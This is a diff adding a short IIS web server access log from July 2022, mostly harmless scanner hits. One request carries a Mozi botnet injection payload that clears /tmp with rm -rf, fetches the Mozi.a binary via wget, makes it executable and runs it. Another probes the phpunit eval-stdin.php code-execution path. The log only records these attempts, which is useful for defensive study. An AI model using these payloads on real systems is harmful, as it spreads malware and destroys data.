@@ -1,0 +1,13 @@
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-30 02:00:12
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-30 02:00:12 192.168.0.23 GET / - 80 - 185.196.220.70 Linux+Gnu+(cow) - 200 0 64 154
+#Software: Microsoft Internet Information Services 10.0
+#Version: 1.0
+#Date: 2022-07-30 02:27:53
+#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken
+2022-07-30 02:27:53 192.168.0.23 GET / - 80 - 192.241.215.211 Mozilla/5.0+zgrab/0.x - 200 0 0 214
+2022-07-30 02:35:47 192.168.0.23 GET /shell cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws 80 - 219.145.74.59 Hello,+world - 404 0 2 195
+2022-07-30 02:45:24 192.168.0.23 GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php - 80 - 185.7.214.104 Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/78.0.3904.108+Safari/537.36 - 404 0 2 193
+2022-07-30 02:46:37 192.168.0.23 GET / - 80 - 193.124.7.9 Go-http-client/1.1 - 200 0 0 218
